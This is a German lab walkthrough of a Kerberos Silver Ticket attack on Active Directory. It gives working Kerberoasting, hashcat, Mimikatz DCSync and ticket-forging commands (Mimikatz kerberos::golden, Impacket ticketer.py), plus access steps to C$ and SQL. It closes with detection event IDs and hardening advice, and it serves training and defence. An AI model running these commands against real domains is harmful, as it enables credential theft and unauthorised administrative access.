# 04 – Silver Ticket

Fälschung eines **TGS** (Service-Tickets) mit dem Schlüssel des **Ziel-Service-Kontos**.
Der Angriff **umgeht den KDC vollständig** — es wird kein TGT beim DC angefordert. Reichweite:
**genau ein Dienst auf einem Host**, dafür aber deutlich **leiser** als ein Golden Ticket.

> ⚠️ Nur im isolierten Lab. Voraussetzung ist der Hash des jeweiligen Service-/Computerkontos
> (z. B. durch Kompromittierung des Hosts oder DCSync).

## Golden vs. Silver — der Unterschied in einem Satz

- **Golden Ticket** = gefälschtes **TGT** (krbtgt-Schlüssel) → domänenweit, DC stellt Service-Tickets aus.
- **Silver Ticket** = gefälschtes **TGS** (Service-Schlüssel) → nur dieser eine Dienst, **kein DC-Kontakt**.

## Voraussetzungen

| Benötigt | Wie im Lab beschaffen |
|----------|-----------------------|
| **Hash des Service-Kontos** (NTLM/AES) | Computerkonto-Hash (z. B. `DC1$`) für CIFS/HOST, oder Service-Account-Hash (z. B. `svc_sql`) via Kerberoasting/DCSync |
| **Domänen-SID** | `Get-ADDomain \| Select DomainSID` |
| **Ziel-SPN** | z. B. `cifs/dc1.lab.local`, `MSSQLSvc/dc1.lab.local:1433`, `host/dc1.lab.local` |

Der **SPN bestimmt, welcher Dienst** angreifbar ist:
| SPN-Service | Zugriff |
|-------------|---------|
| `cifs` | Dateifreigaben / C$ |
| `host` | u. a. Scheduled Tasks / WMI |
| `MSSQLSvc` | SQL-Server |
| `http` | WinRM / IIS |

## Schritt 1 – Service-Hash + SID beschaffen

**Service-Account-Hash (svc_sql) via Kerberoasting** (von VM1, als beliebiger Domänenuser):

```bash
GetUserSPNs.py lab.local/max:'User123!' -dc-ip 10.10.10.10 -request
# -> TGS-REP-Hash offline mit hashcat (Modus 13100) knacken -> Klartextpasswort
```
Aus dem Klartextpasswort den NTLM-Hash bilden (z. B. mit `iconv`/Python `hashlib` MD4-UTF16LE)
oder direkt mit dem Klartext arbeiten.

**Computerkonto-Hash (`DC1$`) oder Service-Hash via DCSync** (Windows/Mimikatz, DA):
```
lsadump::dcsync /domain:lab.local /user:svc_sql
lsadump::dcsync /domain:lab.local /user:DC1$
```

## Schritt 2 – Silver Ticket erstellen & nutzen

### Variante A — Mimikatz (Windows)

```
kerberos::purge
kerberos::golden /user:Administrator /domain:lab.local ^
  /sid:S-1-5-21-1111111111-2222222222-3333333333 ^
  /target:dc1.lab.local /service:cifs ^
  /rc4:<NTLM-HASH_des_Service-/Computerkontos> ^
  /ptt
```
> Gleicher Befehl `kerberos::golden`, aber mit **`/target` + `/service`** → daraus wird ein
> **Silver** Ticket (TGS für genau diesen Dienst), kein TGT.

### Variante B — Impacket (Linux, VM1)

```bash
# TGS für cifs/dc1.lab.local als "Administrator" fälschen
ticketer.py -nthash <NTLM-HASH_des_Servicekontos> \
  -domain-sid S-1-5-21-1111111111-2222222222-3333333333 \
  -domain lab.local \
  -spn cifs/dc1.lab.local Administrator

export KRB5CCNAME=$(pwd)/Administrator.ccache
```

## Schritt 3 – Nachweis (Zugriff auf genau den Dienst)

**Windows (cifs, nach `/ptt`):**
```
klist
dir \\dc1.lab.local\c$
```

**Linux/Impacket:**
```bash
# cifs -> SMB
smbclient.py -k -no-pass lab.local/Administrator@dc1.lab.local
# MSSQLSvc -> SQL (bei svc_sql-Hash + SPN MSSQLSvc/...)
mssqlclient.py -k -no-pass lab.local/Administrator@dc1.lab.local
```
Zugriff **nur auf den gewählten Dienst** belegt den Silver-Ticket-Charakter (im Gegensatz zum
domänenweiten Golden Ticket). Beleg in `notes/` ablegen (nicht committen).

## Detection & Hardening (Kurzform)

**Erkennung** (Details in [`05-detection-hardening.md`](05-detection-hardening.md)):
- **Kein 4768/4769 am DC**, obwohl auf dem Zielhost ein Dienstzugriff (Logon **4624**) stattfindet
  → Lücke „Zugriff ohne KDC-Spur" ist das Kern-IOC des Silver Tickets.
- **RC4**-Nutzung bei Diensten, deren Konto eigentlich AES kann.
- Auffällige/`Administrator`-Zugriffe auf Einzeldienste außerhalb üblicher Muster.

**Härtung:**
- **PAC-Validierung** erzwingen (KDC-Gegenprüfung erschwert gefälschte PACs).
- Service-Account-Passwörter regelmäßig rotieren; besser **gMSA** (automatische, lange Rotation).
- Computerkonto-Passwort-Rotation aktiv lassen (nicht deaktivieren).
- **RC4 deaktivieren**, AES erzwingen; hostseitiges Logging (4624/4672) an SIEM.
